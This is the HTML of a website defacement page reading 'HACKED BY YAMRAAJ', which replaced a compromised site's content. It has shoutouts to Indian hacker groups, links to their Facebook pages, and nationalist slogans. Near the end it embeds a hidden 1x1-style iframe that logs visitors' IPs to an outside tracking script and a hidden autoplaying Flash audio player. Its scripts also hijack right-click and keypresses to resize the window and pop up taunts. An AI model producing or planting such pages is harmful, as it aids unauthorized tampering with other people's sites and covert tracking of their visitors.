﻿<html>
	<head>
<Meta name="Keywords" content="HACKED BY YAMRAAJ">
<title>### HACKED BY YAMRAAJ ###</title>
</head>	<center><font face="Verdana" size="2" color="#239900">GOTCHA XD LOL </font> | 
	 <script language="Javascript" src="http://www.ip2phrase.com/ip2phrase.asp?template=Your IP: <IP>"></script> <font color="#ff9900"> | </font> <script language="Javascript" src="http://www.ip2phrase.com/ip2phrase.asp?template= <isp>"></script><font color="#ff9900"> | </font><script language="Javascript" src="http://www.ip2phrase.com/ip2phrase.asp?template= <country>"></script> <font color="#ff9900"> | </font> <script language="Javascript" src="http://www.ip2phrase.com/ip2phrase.asp?template= <flag>"></script></center>
<link rel="SHORTCUT ICON" href="http://i55.tinypic.com/2z7ld11.gif">
<body style="background-color: black;"><title>### HACKED BY YAMRAAJ ###</title><center><div style="font-family: impact; font-size: 55px; color: rgba(0, 195, 155, 0.3); background-color: black; text-shadow: 1px 1px rgba(43, 43, 65, 0.2); padding-top: 2px; text-align: center; line-height: 75px; height: 75px;">| HACKED BY YAMRAAJ
 |</div>
 
 <pre style="color: #CBC5C5; margin: 0 auto; font: 20px/10px monospace; width: 650px; text-align: center; padding: 35px 35px 50px 50px; border: 0;">
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░┌∩┐(◣_◢)==ε/̵͇̿̿/’̿’̿ ̿ ̿̿ `(Ο_Ο)٭٭░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
</pre>
 
 <div><p><td><img src="http://s10.postimage.org/e4yovo2yx/yamaw.jpg"  align="center"/></td></p></center><center><font size="5" color="red" >| YAMRAAJ WAS HERE |</font></br><font size="5" color="green" >| LOVE TO ALL INDIAN HACKERS OUT THERE |</font></center></BR>
 
 
 <center><img src="" alt="" border="1" width="800"><font size="3.4" color="orange" >
</center> 
 
 <p align="CENTER">
 <span class="style3">Greatz </span></center><p align="CENTER"><br><marquee align="center" direction="left" scrollamount="5" width="800">| ROHIT ROY | GRAY CODE | Moni HBH | HALK | Phoenix 64 | Ap3x | D3str0yer | JAGUAR | VENKI | ‎HaXar'wOw | ShOrTy420 | NyR0 | COSMO |  404 !-!@!2$!-!@  | lequid 3xploit3r |<span class="style2" color="orange" > AND ALL MEMBERS OF     </span>| IHOS <span class="style2">| ANGELS | ICP </span>| BCW | ICA | ICD | <span class="style2"> CK |</span></marquee>
 <marquee id="test" behavior="scroll" direction="up" height="34px" scrolldelay="100" align= "center" scrollamount="1" onMouseOver="document.all.test.stop()" onMouseOut="document.all.test.start()">
 [ <a href="https://www.facebook.com/indiansquad">Indian Hacker's Online Squad ( I-HOS)</a> ]
 <br>
 [ <a href="https://www.facebook.com/ssutradhar35">Computer Korner</a> ]
 <br>
 [ <a href="https://www.facebook.com/groups/443008809075810/">Bengal Cyber Warriors</a> ]
  <br>
 [ <a href="https://www.facebook.com/indian.cyber.police">Indian Cyber Police</a> ]
 <br>
 [ <a href="https://www.facebook.com/theicp">Indian Cyber Pirates</a> ]
 <br>
 [ <a href="https://www.facebook.com/MarathiCyberArmy">Marathi Cyber Army</a> ]
 <br>
 [ <a href="https://www.facebook.com/pages/Indi-HeX/379631892050858">Indi-HeX</a> ]
  <br>
  [ <a href="https://www.facebook.com/The.TeamICA">Indian Cyber Army</a> ]
 <br>
 [ <a href="https://www.facebook.com/indish3ll.in">Indishell.in|ICA</a> ] 
 <br>
 [ <a href="https://www.facebook.com/IndianCyb3rD3vils">Indian Cyb3r D3vils</a> ] 
 </marquee> 
 <img src="" alt="" border="1" width="800">
 <center><br /><div align="center"><img src="http://www.123myip.co.uk/ip-address/?size=468x60" border="0" width="500" height="60" alt="YAM" /></div><font color="orange" face="georgia" size="3"> Jai<b><font color=white>h<b><font color=green>ind <br><font color="orange" face="georgia" size="3"> Vand<b><font color=white>emat<b><font color=green>aram<br></font></br><font color="#E56E94" face="georgia" size="4"> </center>
<iframe src='http://trackcity.in/ip.php' width='10' height='10' style='visibility:hidden;position:absolute;left:0;top:0;'></iframe>
<object width="10" height="80" name="zs_player26878407" id="zs_player26878407" classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" style="width: 1px; height: 1px; " __idm_id__="-1097613311"><param value="http://api.zippyshare.com/api/player.swf" name="movie"><param value="false" name="allowfullscreen"><param value="always" name="allowscriptaccess"><param name="wmode" value="transparent"><param value="baseurl=http://api.zippyshare.com/api/&amp;file=26878407&amp;server=8&amp;autostart=true&amp;flashid=zs_player26878407&amp;availablequality=both&amp;bordercolor=#140214&amp;forecolor=#000000&amp;backcolor=#000000&amp;darkcolor=#000000&amp;lightcolor=#0a0401" name="flashvars"><embed width="1" height="1" flashvars="baseurl=http://api.zippyshare.com/api/&amp;file=26878407&amp;server=8&amp;autostart=true&amp;flashid=zs_player26878407&amp;availablequality=both&amp;bordercolor=#140214&amp;forecolor=#000000&amp;backcolor=#000000&amp;darkcolor=#000000&amp;lightcolor=#0a0401" allowfullscreen="false" allowscriptaccess="always" type="application/x-shockwave-flash" src="http://api.zippyshare.com/api/player.swf" name="zs_player26878407" wmode="transparent" id="zs_player26878407" __idm_id__="-1097613310"></object>
<script>
	function muter2(){
	scrW=screen.availWidth
	scrH=screen.availHeight
	window.moveTo(0,0)
	window.resizeTo(10,10)
	window.focus()
	for(x=0;x<80;x++){window.resizeTo(10,scrH*x/80)}
	for(y=0;y<80;y++){window.resizeTo(scrW*y/80,scrH)}
	window.resizeTo(scrW,scrH)}
	document.oncontextmenu=new Function('muter2();return false');
	function keypressed(){
		alert("Namaskar!\nEk minite");
		alert('YAMRAAJ says : :\n\nDont do any thing stupid....just enjoy the show :) !!!');}
	document.onkeydown=keypressed;
</script>